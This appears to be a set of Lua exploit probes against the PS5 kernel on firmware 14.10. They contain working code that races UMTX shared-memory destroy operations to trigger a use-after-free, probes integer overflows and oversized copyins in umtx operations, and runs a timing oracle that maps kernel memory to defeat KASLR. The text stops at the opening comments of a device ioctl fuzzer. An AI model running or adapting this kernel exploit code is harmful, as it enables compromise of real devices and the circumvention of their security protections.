## probes/phase2_kernel_objects/11_umtx_race.lua

```lua
-- 14.10 Recon Probe 11: UMTX_OP_SHM race condition trigger
-- CVE-2024-43102 pattern: two processes racing SHM destroy
-- Strategy A: rfork(RFPROC|RFMEM) for shared-memory fork
-- Strategy B: single-thread SHM stress (fallback)

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: UMTX RACE ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_umtx_op   = 557,
    sc_rfork     = 251,
    sc_mmap      = 477,
    sc_munmap    = 73,
    sc_nanosleep = 240,
    sc_exit      = 1,
    sc_wait4     = 7,
    sc_close     = 6,
    sc_getpid    = 20,
    sc_shm_open2 = 532,
    sc_ftruncate = 480,
})

local UMTX_OP_SHM  = 25
local SHM_CREAT    = 1
local SHM_LOOKUP   = 2
local SHM_DESTROY  = 4
local SHM_ALIVE    = 8

local PROT_RW  = 3
local MAP_SHARED = 1
local MAP_ANON = 0x1000
local SYNC_SIZE = 4096

local do_strategy_b = true

-- mmap shared anonymous memory (survives rfork with RFMEM)
local sync_ok, sync_ret = pcall(function()
    return syscall.sc_mmap(0, SYNC_SIZE, PROT_RW, MAP_SHARED + MAP_ANON, -1, 0)
end)
local sync_addr = 0
if sync_ok then sync_addr = sync_ret:tonumber() end
log("sync region: " .. string.format("0x%x", sync_addr))

if sync_addr ~= 0 and sync_addr ~= 0xFFFFFFFFFFFFFFFF then
    -- Zero the sync region
    for i = 0, 127, 8 do
        memory.write_qword(sync_addr + i, 0)
    end

    -- Allocate umtx key addresses in shared mapping
    local NUM_ROUNDS = 50
    local KEYS_BASE = sync_addr + 256
    for i = 0, NUM_ROUNDS - 1 do
        memory.write_dword(KEYS_BASE + i * 16, 0xBEEF0000 + i)
    end

    log("")
    log("--- STRATEGY A: rfork race ---")

    local RFPROC = 16
    local RFMEM  = 32

    local rfork_ok, rfork_ret = pcall(function()
        return syscall.sc_rfork(RFPROC + RFMEM)
    end)

    if rfork_ok then
        local fork_rv = rfork_ret:tonumber()
        log("rfork returned: " .. fork_rv)

        if fork_rv > 0 then
            -- PARENT
            do_strategy_b = false
            local child_pid = fork_rv
            log("child pid: " .. child_pid)

            -- Wait briefly for child to start
            local ts_buf = memory.alloc(16)
            memory.write_qword(ts_buf, 0)
            memory.write_qword(ts_buf + 8, 50000000) -- 50ms
            pcall(function() syscall.sc_nanosleep(ts_buf, 0) end)

            local race_hits = 0
            local double_destroy_ok = 0
            local lookup_after_uaf = 0

            for round = 0, NUM_ROUNDS - 1 do
                local key_addr = KEYS_BASE + round * 16

                -- Create the SHM key
                pcall(function()
                    syscall.sc_umtx_op(key_addr, UMTX_OP_SHM, SHM_CREAT, 0, 0, 0)
                end)

                -- Signal GO
                memory.write_dword(sync_addr, round + 1)

                -- RACE: parent destroys too
                local p_ok = pcall(function()
                    syscall.sc_umtx_op(key_addr, UMTX_OP_SHM, SHM_DESTROY, 0, 0, 0)
                end)
                if p_ok then double_destroy_ok = double_destroy_ok + 1 end

                -- Lookup on destroyed key
                pcall(function()
                    local r = syscall.sc_umtx_op(key_addr, UMTX_OP_SHM, SHM_LOOKUP, 0, 0, 0)
                    if r:tonumber() >= 0 then
                        lookup_after_uaf = lookup_after_uaf + 1
                    end
                end)

                race_hits = race_hits + 1
            end

            -- Signal done
            memory.write_dword(sync_addr, 0xFFFF)

            -- Reap child
            pcall(function()
                local status_buf = memory.alloc(4)
                syscall.sc_wait4(child_pid, status_buf, 0, 0)
            end)

            local child_rounds = memory.read_dword(sync_addr + 16):tonumber()

            log("")
            log("RACE RESULTS:")
            log("  rounds (parent): " .. race_hits)
            log("  rounds (child):  " .. child_rounds)
            log("  parent destroy OK: " .. double_destroy_ok)
            log("  lookup after double-free: " .. lookup_after_uaf)

            if lookup_after_uaf > 0 then
                log("  *** UAF INDICATOR: lookup OK on double-freed key ***")
            end

        elseif fork_rv == 0 then
            -- CHILD
            for round = 0, NUM_ROUNDS - 1 do
                local key_addr = KEYS_BASE + round * 16

                -- Wait for parent to signal this round
                local waited = 0
                while memory.read_dword(sync_addr):tonumber() < (round + 1) and waited < 500000 do
                    waited = waited + 1
                end
                if memory.read_dword(sync_addr):tonumber() == 0xFFFF then break end

                -- RACE: destroy same key
                pcall(function()
                    syscall.sc_umtx_op(key_addr, UMTX_OP_SHM, SHM_DESTROY, 0, 0, 0)
                end)

                -- Lookup on destroyed key
                pcall(function()
                    syscall.sc_umtx_op(key_addr, UMTX_OP_SHM, SHM_LOOKUP, 0, 0, 0)
                end)

                local cc = memory.read_dword(sync_addr + 16):tonumber()
                memory.write_dword(sync_addr + 16, cc + 1)
            end

            pcall(function() syscall.sc_exit(0) end)
            return ""
        else
            log("rfork error code: " .. fork_rv)
        end
    else
        log("rfork FAILED: " .. tostring(rfork_ret):sub(1, 60))
    end
end

-- ============================================================
-- STRATEGY B: single-thread SHM stress
-- ============================================================
if do_strategy_b then
    log("")
    log("--- STRATEGY B: single-thread SHM stress ---")

    -- Test 1: create-destroy-create-lookup cycle
    local alias_hits = 0
    for i = 1, 200 do
        local key = memory.alloc(16)
        memory.write_dword(key, 0xAAAA0000 + i)
        pcall(function() syscall.sc_umtx_op(key, UMTX_OP_SHM, SHM_CREAT, 0, 0, 0) end)
        pcall(function() syscall.sc_umtx_op(key, UMTX_OP_SHM, SHM_DESTROY, 0, 0, 0) end)
        pcall(function() syscall.sc_umtx_op(key, UMTX_OP_SHM, SHM_CREAT, 0, 0, 0) end)
        local lok = pcall(function()
            local r = syscall.sc_umtx_op(key, UMTX_OP_SHM, SHM_LOOKUP, 0, 0, 0)
            if r:tonumber() >= 0 then alias_hits = alias_hits + 1 end
        end)
    end
    log("  create-destroy-create-lookup: " .. alias_hits .. "/200")

    -- Test 2: destroy with different value at same address
    local diff_val_hits = 0
    local test_key = memory.alloc(16)
    for i = 1, 100 do
        memory.write_dword(test_key, 0xBBBB0000 + i)
        pcall(function() syscall.sc_umtx_op(test_key, UMTX_OP_SHM, SHM_CREAT, 0, 0, 0) end)
        memory.write_dword(test_key, 0xCCCC0000 + i)
        local dok = pcall(function()
            local r = syscall.sc_umtx_op(test_key, UMTX_OP_SHM, SHM_DESTROY, 0, 0, 0)
            if r:tonumber() >= 0 then diff_val_hits = diff_val_hits + 1 end
        end)
    end
    log("  destroy diff value same addr: " .. diff_val_hits .. "/100")

    -- Test 3: burst create then LIFO destroy
    local burst_keys = {}
    local burst_ok = 0
    for i = 1, 500 do
        local k = memory.alloc(16)
        memory.write_dword(k, 0xDD000000 + i)
        local ok = pcall(function()
            syscall.sc_umtx_op(k, UMTX_OP_SHM, SHM_CREAT, 0, 0, 0)
        end)
        if ok then burst_ok = burst_ok + 1; burst_keys[#burst_keys + 1] = k end
    end
    local burst_destroy = 0
    for i = #burst_keys, 1, -1 do
        local ok = pcall(function()
            syscall.sc_umtx_op(burst_keys[i], UMTX_OP_SHM, SHM_DESTROY, 0, 0, 0)
        end)
        if ok then burst_destroy = burst_destroy + 1 end
    end
    log("  burst create/LIFO destroy: " .. burst_ok .. "/" .. burst_destroy)

    -- Test 4: interleave two keys
    local interleave_ok = 0
    local k1 = memory.alloc(16)
    local k2 = memory.alloc(16)
    memory.write_dword(k1, 0xEE000001)
    memory.write_dword(k2, 0xEE000002)
    for i = 1, 300 do
        pcall(function() syscall.sc_umtx_op(k1, UMTX_OP_SHM, SHM_CREAT, 0, 0, 0) end)
        pcall(function() syscall.sc_umtx_op(k2, UMTX_OP_SHM, SHM_CREAT, 0, 0, 0) end)
        pcall(function() syscall.sc_umtx_op(k1, UMTX_OP_SHM, SHM_DESTROY, 0, 0, 0) end)
        local ok = pcall(function()
            local r = syscall.sc_umtx_op(k2, UMTX_OP_SHM, SHM_LOOKUP, 0, 0, 0)
            if r:tonumber() >= 0 then interleave_ok = interleave_ok + 1 end
        end)
        pcall(function() syscall.sc_umtx_op(k2, UMTX_OP_SHM, SHM_DESTROY, 0, 0, 0) end)
    end
    log("  interleave k1/k2 lookup: " .. interleave_ok .. "/300")

    -- Test 5: robust list + SHM interaction
    log("")
    log("  robust+shm interaction...")
    local robust_params = memory.alloc(64)
    local shm_key = memory.alloc(64)
    memory.write_dword(shm_key, 0xFF000001)
    pcall(function() syscall.sc_umtx_op(shm_key, UMTX_OP_SHM, SHM_CREAT, 0, 0, 0) end)

    memory.write_qword(robust_params, 24)
    memory.write_qword(robust_params + 8, shm_key)
    memory.write_qword(robust_params + 16, 0)
    local rob_ok = pcall(function()
        syscall.sc_umtx_op(robust_params, 26, 24, 0, 0, 0) -- UMTX_OP_ROBUST_LISTS=26
    end)
    log("  register robust -> SHM: " .. (rob_ok and "OK" or "FAIL"))

    pcall(function() syscall.sc_umtx_op(shm_key, UMTX_OP_SHM, SHM_DESTROY, 0, 0, 0) end)
    log("  destroyed SHM under robust list")
    log("  still alive: pid=" .. syscall.getpid():tonumber())

    -- Deregister
    memory.write_qword(robust_params + 8, 0)
    pcall(function() syscall.sc_umtx_op(robust_params, 26, 24, 0, 0, 0) end)
end

log("")
log("=== UMTX RACE DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
```

## probes/phase2_kernel_objects/12_nwake_robust.lua

```lua
-- 14.10 Recon Probe 12: NWAKE_PRIVATE integer overflow + ROBUST_LISTS oversized copyin
-- Two non-race kernel bugs from probe 10:
-- 1) UMTX_OP_NWAKE_PRIVATE accepts count=INT_MAX (kernel reads count*8 from userland)
-- 2) UMTX_OP_ROBUST_LISTS accepts size=4096 (struct is only 24 bytes)

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: NWAKE + ROBUST DEEP DIVE ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_umtx_op = 557,
    sc_mmap = 477,
    sc_munmap = 73,
    sc_getpid = 20,
})

local UMTX_OP_NWAKE_PRIVATE = 21
local UMTX_OP_ROBUST_LISTS  = 26
local UMTX_OP_WAIT_UINT_PRIVATE = 15
local UMTX_OP_WAKE_PRIVATE  = 16

-- ============================================================
-- PART 1: UMTX_OP_NWAKE_PRIVATE deep probe
-- The kernel does: copyin(uaddr, count * sizeof(void*))
-- If count * 8 overflows size_t, copyin gets a small buffer
-- but the kernel iterates 'count' times -> heap overflow read
-- ============================================================
log("")
log("--- PART 1: NWAKE_PRIVATE integer overflow ---")

-- First: confirm what counts succeed/fail
-- The kernel should validate count, but probe 10 showed INT_MAX works
local test_counts = {
    0, 1, 2, 4, 8, 16, 64, 256, 1024, 4096,
    16384, 65536, 262144, 1048576,
    0x10000000, 0x20000000, 0x40000000, 0x7FFFFFFF,
}

-- Allocate a large valid array of pointers
local array_size = 4096 * 8 -- 4096 pointers
local wake_array = memory.alloc(array_size + 4096)

-- Fill with valid (but unwaited) addresses
local dummy_addrs = {}
for i = 0, 255 do
    dummy_addrs[i] = memory.alloc(16)
    memory.write_dword(dummy_addrs[i], 0) -- nobody waiting
    memory.write_qword(wake_array + i * 8, dummy_addrs[i])
end
-- Fill rest with zeros
for i = 256, 4095 do
    memory.write_qword(wake_array + i * 8, 0)
end

log("  testing count values...")
for _, count in ipairs(test_counts) do
    local ok, err = pcall(function()
        return syscall.sc_umtx_op(wake_array, UMTX_OP_NWAKE_PRIVATE, count, 0, 0, 0)
    end)
    local rv = "?"
    if ok then
        rv = tostring(err:tonumber())
    else
        rv = "ERR:" .. tostring(err):sub(1, 25)
    end
    log(string.format("  count=0x%08x (%10d): %s", count, count, rv))
end

-- Test: what if array points to unmapped memory?
-- If kernel doesn't validate, it'll fault on copyin
log("")
log("  testing with array at unmapped region...")
local unmapped = 0x7FF000000000 -- likely unmapped high userspace

local um_ok, um_err = pcall(function()
    return syscall.sc_umtx_op(unmapped, UMTX_OP_NWAKE_PRIVATE, 1, 0, 0, 0)
end)
log("  unmapped array, count=1: " .. (um_ok and tostring(um_err:tonumber()) or "ERR:" .. tostring(um_err):sub(1,30)))

local um2_ok, um2_err = pcall(function()
    return syscall.sc_umtx_op(unmapped, UMTX_OP_NWAKE_PRIVATE, 0x7FFFFFFF, 0, 0, 0)
end)
log("  unmapped array, count=MAX: " .. (um2_ok and tostring(um2_err:tonumber()) or "ERR:" .. tostring(um2_err):sub(1,30)))

-- Test: count that causes count*8 to overflow to a small value
-- 0x2000000000000001 * 8 = 8 (overflow), but count is int so max is 0x7FFFFFFF
-- 0x7FFFFFFF * 8 = 0x3FFFFFFF8 (4GB) — doesn't overflow on 64-bit
-- But if kernel uses int32 for the size: 0x7FFFFFFF * 8 = truncated
-- Let's check if the kernel uses a 32-bit multiply
log("")
log("  testing overflow boundary...")

-- 0x20000000 * 8 = 0x100000000 — overflows 32-bit to 0
local overflow_count = 0x20000000
local ov_ok, ov_err = pcall(function()
    return syscall.sc_umtx_op(wake_array, UMTX_OP_NWAKE_PRIVATE, overflow_count, 0, 0, 0)
end)
log(string.format("  count=0x20000000 (32-bit overflow to 0): %s",
    ov_ok and tostring(ov_err:tonumber()) or "ERR:" .. tostring(ov_err):sub(1,30)))

-- 0x20000001 * 8 = 0x100000008 — overflows to 8 (1 pointer)
local ov2 = 0x20000001
local ov2_ok, ov2_err = pcall(function()
    return syscall.sc_umtx_op(wake_array, UMTX_OP_NWAKE_PRIVATE, ov2, 0, 0, 0)
end)
log(string.format("  count=0x20000001 (overflows to 8): %s",
    ov2_ok and tostring(ov2_err:tonumber()) or "ERR:" .. tostring(ov2_err):sub(1,30)))

-- Timing test: does INT_MAX take noticeably longer?
-- If the kernel actually iterates INT_MAX times, it'll hang
log("")
log("  timing test (count=256 vs count=0x40000000)...")

-- Measure count=256
local t1_start = os.clock()
pcall(function()
    syscall.sc_umtx_op(wake_array, UMTX_OP_NWAKE_PRIVATE, 256, 0, 0, 0)
end)
local t1_end = os.clock()
log(string.format("  count=256: %.4f sec", t1_end - t1_start))

-- Measure count=0x01000000 (16M)
local t2_start = os.clock()
pcall(function()
    syscall.sc_umtx_op(wake_array, UMTX_OP_NWAKE_PRIVATE, 0x01000000, 0, 0, 0)
end)
local t2_end = os.clock()
log(string.format("  count=0x01000000 (16M): %.4f sec", t2_end - t2_start))

-- ============================================================
-- PART 2: UMTX_OP_ROBUST_LISTS oversized copyin
-- Kernel does copyin(uaddr, val) where val is the size arg.
-- Struct is 24 bytes but 4096 was accepted.
-- This means kernel reads 4096 bytes from userspace into a
-- kernel buffer — potential heap info leak on the way back,
-- or kernel stack overflow if the buffer is on the stack.
-- ============================================================
log("")
log("--- PART 2: ROBUST_LISTS oversized struct ---")

-- Test exact boundary: what sizes are accepted?
local test_sizes = {
    0, 1, 8, 16, 23, 24, 25, 32, 48, 64, 128, 256, 512,
    1024, 2048, 4096, 8192, 16384, 32768, 65536,
}

local robust_buf = memory.alloc(65536 + 4096)
-- Fill with a pattern so we can detect what gets read/written
for i = 0, 65535, 4 do
    memory.write_dword(robust_buf + i, 0x41414141)
end
-- Valid header
memory.write_qword(robust_buf, 24) -- size field
local dummy_list = memory.alloc(4096)
memory.write_qword(dummy_list, 0)
memory.write_qword(robust_buf + 8, dummy_list) -- robust_list_offset
memory.write_qword(robust_buf + 16, 0)         -- robust_inact_offset

log("  testing size values...")
for _, size in ipairs(test_sizes) do
    -- Reset size field to match what we're passing
    memory.write_qword(robust_buf, size)

    local ok, err = pcall(function()
        return syscall.sc_umtx_op(robust_buf, UMTX_OP_ROBUST_LISTS, size, 0, 0, 0)
    end)
    local rv = "?"
    if ok then
        rv = "OK (ret=" .. tostring(err:tonumber()) .. ")"
    else
        rv = "ERR:" .. tostring(err):sub(1, 30)
    end
    log(string.format("  size=%5d: %s", size, rv))
end

-- Now the key question: does the kernel WRITE BACK to our buffer?
-- If copyin reads 4096 bytes and then copyout writes back,
-- we might get kernel data leaked into our buffer.
log("")
log("  checking for kernel data leakback...")

-- Fill buffer with recognizable pattern
for i = 0, 4095, 4 do
    memory.write_dword(robust_buf + i, 0xDEADBEEF)
end
memory.write_qword(robust_buf, 4096) -- size
memory.write_qword(robust_buf + 8, dummy_list)
memory.write_qword(robust_buf + 16, 0)

-- Register with oversized struct
pcall(function()
    syscall.sc_umtx_op(robust_buf, UMTX_OP_ROBUST_LISTS, 4096, 0, 0, 0)
end)

-- Check if kernel modified our buffer beyond the 24-byte struct
local changed_offsets = {}
for i = 24, 4095, 4 do
    local val = memory.read_dword(robust_buf + i):tonumber()
    if val ~= 0xDEADBEEF then
        changed_offsets[#changed_offsets + 1] = {offset = i, value = val}
    end
end

if #changed_offsets > 0 then
    log("  *** KERNEL WROTE BACK " .. #changed_offsets .. " dwords beyond struct! ***")
    for _, c in ipairs(changed_offsets) do
        log(string.format("    +%d: 0x%08x (was 0xDEADBEEF)", c.offset, c.value))
    end
else
    log("  no modifications beyond struct (copyin only, no copyout)")
end

-- Check if the first 24 bytes were modified (kernel might normalize)
log("")
log("  first 24 bytes after register:")
for i = 0, 16, 8 do
    local lo = memory.read_dword(robust_buf + i):tonumber()
    local hi = memory.read_dword(robust_buf + i + 4):tonumber()
    log(string.format("    +%d: 0x%08x%08x", i, hi, lo))
end

-- Deregister
memory.write_qword(robust_buf, 24)
memory.write_qword(robust_buf + 8, 0)
memory.write_qword(robust_buf + 16, 0)
pcall(function()
    syscall.sc_umtx_op(robust_buf, UMTX_OP_ROBUST_LISTS, 24, 0, 0, 0)
end)

-- ============================================================
-- PART 3: ROBUST_LISTS kernel stack probe
-- If the kernel uses a stack buffer for copyin, we can overflow
-- it by passing a huge size. Try increasing sizes to find crash.
-- ============================================================
log("")
log("--- PART 3: ROBUST_LISTS stack overflow test ---")

-- Use progressively larger sizes, watching for crash
local stack_sizes = { 256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65536 }
local big_buf = memory.alloc(65536 + 4096)

for _, size in ipairs(stack_sizes) do
    -- Fill with pattern
    for i = 0, size - 1, 8 do
        if i + 8 <= size then
            memory.write_qword(big_buf + i, 0x4242424242424242)
        end
    end
    memory.write_qword(big_buf, size)
    memory.write_qword(big_buf + 8, dummy_list)
    memory.write_qword(big_buf + 16, 0)

    local ok, err = pcall(function()
        return syscall.sc_umtx_op(big_buf, UMTX_OP_ROBUST_LISTS, size, 0, 0, 0)
    end)
    local alive = pcall(function() return syscall.getpid():tonumber() end)
    log(string.format("  size=%5d: %s (alive=%s)", size,
        ok and "OK" or "ERR:" .. tostring(err):sub(1,20),
        tostring(alive)))

    -- Deregister after each test
    memory.write_qword(big_buf, 24)
    memory.write_qword(big_buf + 8, 0)
    memory.write_qword(big_buf + 16, 0)
    pcall(function() syscall.sc_umtx_op(big_buf, UMTX_OP_ROBUST_LISTS, 24, 0, 0, 0) end)
end

-- ============================================================
-- PART 4: NWAKE with crafted pointer array
-- If the kernel reads count pointers and tries to wake each one,
-- we can point some entries at interesting kernel-adjacent addresses
-- and observe behavior (error codes, timing differences)
-- ============================================================
log("")
log("--- PART 4: NWAKE crafted pointer array ---")

-- Test: array with NULL pointer
local craft_array = memory.alloc(4096)
memory.write_qword(craft_array, 0) -- NULL pointer
local null_ok, null_err = pcall(function()
    return syscall.sc_umtx_op(craft_array, UMTX_OP_NWAKE_PRIVATE, 1, 0, 0, 0)
end)
log("  NULL pointer in array: " .. (null_ok and "OK" or "ERR:" .. tostring(null_err):sub(1,30)))

-- Test: array with near-NULL pointer (page 0)
memory.write_qword(craft_array, 4)
local low_ok = pcall(function()
    return syscall.sc_umtx_op(craft_array, UMTX_OP_NWAKE_PRIVATE, 1, 0, 0, 0)
end)
log("  addr=4 in array: " .. (low_ok and "OK" or "FAIL"))

-- Test: array with high userspace address (near kernel boundary)
memory.write_qword(craft_array, 0x00007FFFFFFFFFFF) -- top of user space
local high_ok = pcall(function()
    return syscall.sc_umtx_op(craft_array, UMTX_OP_NWAKE_PRIVATE, 1, 0, 0, 0)
end)
log("  addr=0x7FFFFFFFFFFF: " .. (high_ok and "OK" or "FAIL"))

-- Test: array with kernel-space address (should EFAULT)
memory.write_qword(craft_array, 0xFFFFFFFF80000000) -- kernel text
local kern_ok, kern_err = pcall(function()
    return syscall.sc_umtx_op(craft_array, UMTX_OP_NWAKE_PRIVATE, 1, 0, 0, 0)
end)
log("  addr=kernel text: " .. (kern_ok and "OK(!)" or "ERR:" .. tostring(kern_err):sub(1,30)))

-- Test: mix of valid and kernel addresses
-- Does the kernel stop at first bad addr or continue?
local mixed = memory.alloc(256)
local valid_addr = memory.alloc(16)
memory.write_dword(valid_addr, 0)
memory.write_qword(mixed, valid_addr)             -- [0] valid
memory.write_qword(mixed + 8, 0xFFFFFFFF80000000) -- [1] kernel
memory.write_qword(mixed + 16, valid_addr)         -- [2] valid

local mix_ok, mix_err = pcall(function()
    return syscall.sc_umtx_op(mixed, UMTX_OP_NWAKE_PRIVATE, 3, 0, 0, 0)
end)
log("  mixed valid+kernel array: " .. (mix_ok and "OK" or "ERR:" .. tostring(mix_err):sub(1,30)))
if mix_ok then
    log("  *** kernel processes array past bad addresses! ***")
end

log("")
log("=== NWAKE + ROBUST DEEP DIVE DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
```

## probes/phase2_kernel_objects/13_nwake_oracle.lua

```lua
-- 14.10 Recon Probe 13: NWAKE_PRIVATE kernel address oracle
-- Finding: kernel doesn't validate that wake addresses are userspace
-- Strategy: pass kernel addresses in the NWAKE pointer array and measure
-- timing/return differences to map live kernel memory regions
-- PS5 kernel: FreeBSD amd64 — kernel text at 0xFFFFFFFF8xxxxxxx,
-- DMAP at 0xFFFFF800xxxxxxxx, kernel heap in between

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: NWAKE KERNEL ORACLE ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_umtx_op = 557,
    sc_mmap = 477,
    sc_getpid = 20,
    sc_nanosleep = 240,
    sc_clock_gettime = 232,
})

local UMTX_OP_NWAKE_PRIVATE = 21
local UMTX_OP_WAKE_PRIVATE = 16

-- High-precision timer using clock_gettime(CLOCK_MONOTONIC)
local CLOCK_MONOTONIC = 4
local ts_buf = memory.alloc(16)

local function get_ns()
    syscall.sc_clock_gettime(CLOCK_MONOTONIC, ts_buf)
    local sec = memory.read_qword(ts_buf):tonumber()
    local nsec = memory.read_qword(ts_buf + 8):tonumber()
    return sec * 1000000000 + nsec
end

-- ============================================================
-- PART 1: Baseline timing — userspace vs kernel addresses
-- ============================================================
log("")
log("--- PART 1: timing baseline ---")

local wake_array = memory.alloc(4096)
local valid_addr = memory.alloc(64)
memory.write_dword(valid_addr, 0)

-- Warm up
for i = 1, 100 do
    memory.write_qword(wake_array, valid_addr)
    pcall(function() syscall.sc_umtx_op(wake_array, UMTX_OP_NWAKE_PRIVATE, 1, 0, 0, 0) end)
end

-- Measure userspace address (1000 iterations)
local user_times = {}
for i = 1, 1000 do
    memory.write_qword(wake_array, valid_addr)
    local t0 = get_ns()
    pcall(function() syscall.sc_umtx_op(wake_array, UMTX_OP_NWAKE_PRIVATE, 1, 0, 0, 0) end)
    local t1 = get_ns()
    user_times[#user_times + 1] = t1 - t0
end

-- Sort and get median
table.sort(user_times)
local user_median = user_times[500]
local user_min = user_times[1]
local user_max = user_times[1000]
log(string.format("  userspace addr: min=%d med=%d max=%d ns", user_min, user_median, user_max))

-- Measure kernel text address
local kern_times = {}
for i = 1, 1000 do
    memory.write_qword(wake_array, 0xFFFFFFFF82200000) -- typical kernel text
    local t0 = get_ns()
    pcall(function() syscall.sc_umtx_op(wake_array, UMTX_OP_NWAKE_PRIVATE, 1, 0, 0, 0) end)
    local t1 = get_ns()
    kern_times[#kern_times + 1] = t1 - t0
end
table.sort(kern_times)
log(string.format("  kernel text:    min=%d med=%d max=%d ns", kern_times[1], kern_times[500], kern_times[1000]))

-- Measure unmapped kernel address
local unmap_times = {}
for i = 1, 1000 do
    memory.write_qword(wake_array, 0xDEAD000000000000) -- definitely unmapped
    local t0 = get_ns()
    pcall(function() syscall.sc_umtx_op(wake_array, UMTX_OP_NWAKE_PRIVATE, 1, 0, 0, 0) end)
    local t1 = get_ns()
    unmap_times[#unmap_times + 1] = t1 - t0
end
table.sort(unmap_times)
log(string.format("  unmapped:       min=%d med=%d max=%d ns", unmap_times[1], unmap_times[500], unmap_times[1000]))

-- Measure NULL address
local null_times = {}
for i = 1, 1000 do
    memory.write_qword(wake_array, 0)
    local t0 = get_ns()
    pcall(function() syscall.sc_umtx_op(wake_array, UMTX_OP_NWAKE_PRIVATE, 1, 0, 0, 0) end)
    local t1 = get_ns()
    null_times[#null_times + 1] = t1 - t0
end
table.sort(null_times)
log(string.format("  NULL:           min=%d med=%d max=%d ns", null_times[1], null_times[500], null_times[1000]))

-- ============================================================
-- PART 2: Also test UMTX_OP_WAKE_PRIVATE directly
-- (simpler path, single address, might be faster to measure)
-- ============================================================
log("")
log("--- PART 2: WAKE_PRIVATE single-addr oracle ---")

-- Warm up
for i = 1, 100 do
    pcall(function() syscall.sc_umtx_op(valid_addr, UMTX_OP_WAKE_PRIVATE, 1, 0, 0, 0) end)
end

local function measure_wake(addr, label, count)
    local times = {}
    for i = 1, count do
        local t0 = get_ns()
        pcall(function() syscall.sc_umtx_op(addr, UMTX_OP_WAKE_PRIVATE, 1, 0, 0, 0) end)
        local t1 = get_ns()
        times[#times + 1] = t1 - t0
    end
    table.sort(times)
    local mid = math.floor(count / 2)
    log(string.format("  %-24s min=%d med=%d max=%d ns", label,
        times[1], times[mid], times[count]))
    return times[mid]
end

measure_wake(valid_addr, "userspace", 1000)
measure_wake(0xFFFFFFFF82200000, "kernel text", 1000)
measure_wake(0xFFFFF80000000000, "DMAP base", 1000)
measure_wake(0xDEAD000000000000, "unmapped high", 1000)
measure_wake(0, "NULL", 1000)
measure_wake(1, "addr=1", 1000)

-- ============================================================
-- PART 3: Kernel text scan
-- FreeBSD amd64 kernel loads at 0xFFFFFFFF80200000 typically
-- PS5 may randomize (KASLR). Scan at 2MB intervals to find
-- where timing changes — indicates mapped kernel page.
-- ============================================================
log("")
log("--- PART 3: kernel text KASLR scan ---")

-- Scan 0xFFFFFFFF80000000 to 0xFFFFFFFF90000000 at 2MB steps
local SCAN_BASE = 0xFFFFFFFF80000000
local SCAN_END  = 0xFFFFFFFF90000000
local STEP = 0x200000 -- 2MB

local scan_results = {}
for addr = SCAN_BASE, SCAN_END, STEP do
    local times = {}
    for i = 1, 200 do
        local t0 = get_ns()
        pcall(function() syscall.sc_umtx_op(addr, UMTX_OP_WAKE_PRIVATE, 1, 0, 0, 0) end)
        local t1 = get_ns()
        times[#times + 1] = t1 - t0
    end
    table.sort(times)
    local med = times[100]
    scan_results[#scan_results + 1] = {addr = addr, med = med}
end

-- Sort by timing to find outliers
table.sort(scan_results, function(a, b) return a.med < b.med end)
log("  fastest (possibly mapped):")
for i = 1, math.min(10, #scan_results) do
    local r = scan_results[i]
    log(string.format("    0x%016x: %d ns", r.addr, r.med))
end
log("  slowest (possibly unmapped):")
for i = math.max(1, #scan_results - 4), #scan_results do
    local r = scan_results[i]
    log(string.format("    0x%016x: %d ns", r.addr, r.med))
end

-- ============================================================
-- PART 4: DMAP scan
-- DMAP maps all physical memory at a fixed virtual offset
-- Typically 0xFFFFF80000000000 on FreeBSD amd64
-- PS5 has 16GB RAM, so DMAP goes to +0x400000000
-- ============================================================
log("")
log("--- PART 4: DMAP region scan ---")

local DMAP_BASE = 0xFFFFF80000000000
local DMAP_END  = 0xFFFFF80400000000 -- +16GB
local DMAP_STEP = 0x40000000 -- 1GB steps

local dmap_results = {}
for addr = DMAP_BASE, DMAP_END, DMAP_STEP do
    local times = {}
    for i = 1, 200 do
        local t0 = get_ns()
        pcall(function() syscall.sc_umtx_op(addr, UMTX_OP_WAKE_PRIVATE, 1, 0, 0, 0) end)
        local t1 = get_ns()
        times[#times + 1] = t1 - t0
    end
    table.sort(times)
    local med = times[100]
    dmap_results[#dmap_results + 1] = {addr = addr, med = med}
    log(string.format("  0x%016x: %d ns", addr, med))
end

-- ============================================================
-- PART 5: Return value analysis
-- Does the kernel return different values for mapped vs unmapped?
-- ============================================================
log("")
log("--- PART 5: return value analysis ---")

local function check_rv(addr, label)
    local ok, ret = pcall(function()
        return syscall.sc_umtx_op(addr, UMTX_OP_WAKE_PRIVATE, 1, 0, 0, 0)
    end)
    if ok then
        log(string.format("  %-30s rv=%d", label, ret:tonumber()))
    else
        log(string.format("  %-30s ERR: %s", label, tostring(ret):sub(1, 40)))
    end
end

check_rv(valid_addr, "userspace valid")
check_rv(0, "NULL")
check_rv(1, "addr=1")
check_rv(0x1000, "addr=0x1000")
check_rv(0xFFFFFFFF80200000, "kern text +200000")
check_rv(0xFFFFFFFF82000000, "kern text +2000000")
check_rv(0xFFFFFFFF84000000, "kern text +4000000")
check_rv(0xFFFFFFFF90000000, "kern high")
check_rv(0xFFFFF80000000000, "DMAP base")
check_rv(0xFFFFF80100000000, "DMAP +4GB")
check_rv(0xFFFFF80200000000, "DMAP +8GB")
check_rv(0xFFFFF80400000000, "DMAP +16GB")
check_rv(0xFFFFF80800000000, "DMAP +32GB (past RAM)")
check_rv(0xDEAD000000000000, "unmapped high")
check_rv(0xFFFF800000000000, "kernel base")

log("")
log("=== NWAKE ORACLE DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
```

## probes/phase2_kernel_objects/14_device_ioctl.lua

```lua
-- 14.10 Recon Probe 14: Device ioctl fuzzing
-- PS5-specific devices are custom Sony kernel drivers — prime bug surface
-- Probe 05 showed these open: dmem0, dmem1, dmem2, gc, hid, ajm, camera
-- Strategy: open each device, try known + speculative ioctl numbers,
